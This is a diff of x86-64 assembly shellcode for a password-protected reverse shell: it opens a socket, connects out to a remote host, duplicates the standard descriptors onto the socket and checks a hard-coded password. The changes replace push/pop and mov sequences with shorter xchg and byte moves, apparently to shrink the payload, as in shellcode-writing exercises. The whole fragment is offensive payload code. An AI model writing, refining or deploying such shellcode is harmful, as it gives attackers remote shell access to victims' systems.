@@ -17,7 +17,7 @@ _start:
         syscall
 
         ; copy socket descriptor to rdi for future use 
-        mov rdi, rax
+        xchg rdi, rax
 
         ; server.sin_family = AF_INET 
         ; server.sin_port = htons(PORT)
@@ -32,10 +32,8 @@ _start:
         ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
         
         mov rsi, rsp
-        push 42
-        pop rax
-        push 16
-        pop rdx
+        mov al,42
+        mov dl,16
         syscall
 
         ; duplicate sockets
@@ -55,12 +53,11 @@ dup2cycle:
         xor rdi,rdi
         push rax
         mov rsi,rsp
-        push 8
-        pop rdx
+        mov dl,8
         syscall
 
         ; Authentication with password "1234567"
-        mov rcx,rax
+        xchg rcx,rax
         mov rbx,0x0a37363534333231
         push rbx
         mov rdi,rsp
@@ -84,3 +81,4 @@ dup2cycle:
 
 wrong_pwd:
         nop
+
